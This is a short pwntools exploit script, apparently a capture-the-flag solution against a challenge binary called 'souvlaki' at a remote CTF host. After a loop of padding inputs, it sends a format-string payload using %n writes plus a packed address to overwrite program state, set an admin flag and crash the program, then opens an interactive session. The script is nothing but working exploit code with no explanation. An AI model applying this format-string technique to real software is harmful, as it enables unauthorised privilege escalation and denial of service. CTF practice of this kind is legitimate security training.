from pwn import *

if args.REMOTE:
    p = remote('ctf.pwn.sg', 4006)
else:
    p = process('./souvlaki')

for i in range(37, 129):
    p.recvuntil(': ')
    p.send('A'*i)
    p.recvline()


p.recvuntil(': ')
# set global_state.presenter to our input, and using 
# format string, set global_state.admin=1 and also crash the program
p.send('A%7$nA%2$n'.ljust(128, 'A')+p32(0x00098c9c+4))
p.interactive()
    


